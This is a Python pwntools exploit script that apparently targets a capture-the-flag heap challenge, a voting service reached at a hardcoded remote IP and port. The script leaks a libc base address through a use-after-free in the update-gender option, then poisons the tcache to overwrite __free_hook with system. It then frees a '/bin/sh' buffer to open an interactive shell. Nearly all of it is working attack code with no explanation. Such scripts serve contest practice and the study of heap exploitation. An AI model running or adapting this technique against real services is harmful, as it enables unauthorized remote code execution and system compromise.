from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "69.90.132.248"
    port = 3371
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

def results():
    rs(1, r='>')
    recvuntil('Votes:\n')
    ls = []
    while True:
        l = recvline()
        if l == '':
            break
        l = l.split(': ')
        ls.append((l[0], int(l[1])))
    return ls

def statistics():
    rs(2, r='>')
    recvuntil('stats:')
    ls = []
    while True:
        l = recvline()
        if l == '':
            break
        l = l.split(': ')
        ls.append((l[0], int(l[1])))
    return ls


def delete_meta(id):
    rs(3, r='>')
    rs(hex(id))
    recvuntil('------------------------------------')

def update_gender(id, gender):
    rs(4, r='>')
    rs(hex(id))
    recvuntil('gender: ')
    s = recvuntil('\nWhat is')
    if gender is None:
        rs(s[:24], r='?')
    else:
        rs(gender, r='?')
    recvuntil('------------------------------------')
    return s

def vote(employed, age, gender, state, vote, ret=False):
    rs(5, r='>')
    rs(employed, r='?')
    rs(age, r='?')
    rs(gender, r='?')
    if ret:
        return
    rs(state, r='?')
    rs(vote, r='?')
    recvuntil('Your vote ID is 0x')
    id = int(recvuntil('.'), 16)
    recvuntil('------------------------------------')
    return id

if is_gaibu:
    free_hook_offset = 0x3ed8e8
    system_offset = 0x4f550
    libc_base_offset = 0x2000c0
else:
    free_hook_offset = 0x1eeb28
    system_offset = 0x55410
    libc_base_offset = 0

y = vote("y", 1234, "Z" * 0x400, "HHHHHHHHHHHHHHHHH", "k")
#z = vote("y", 1234, "gender" * 40, "HHHHHHHHHHHHHHHHH", "k")
delete_meta(y)
leak = update_gender(y, None)
#print(leak[8:16])
libcbase = u64(leak[8:16]) - 0x1ebbe0
print(hex(libcbase))

y = vote("y", 1234, "Z" * 0x400, "HHHHHHHHHHHHHHHHH", "k")


libcbase -= libc_base_offset
system = libcbase + system_offset
free_hook = libcbase + free_hook_offset

z = vote("y", 1234, "genderer" * 20, "H", "k")
x = vote("y", 1234, "genderer" * 20, "H", "k")
print(hex(x))
delete_meta(x)
delete_meta(z)
leak = update_gender(z, p64(free_hook - 8))
heapbase = u64(leak[8:16]) - 0x10
print(hex(heapbase))

wait_for_attach()

z = vote("y", 1234, "/bin/sh\x00" * 20 , "HHHHHHHHHHHHHHHHH", "k")
wait_for_attach()
w = vote("y", 1234, "/bin/sh\x00" + p64(system) + p64(0) * 18,
        "HHHHHHHHHHHHHHHHH", "k", ret=True)
#w = vote("y", 1234, p64(system) + 'A' * 472, "HHHHHHHHHHHHHHHHH", "k")



#leak = update_gender(x, 'H' * 100)


interactive()
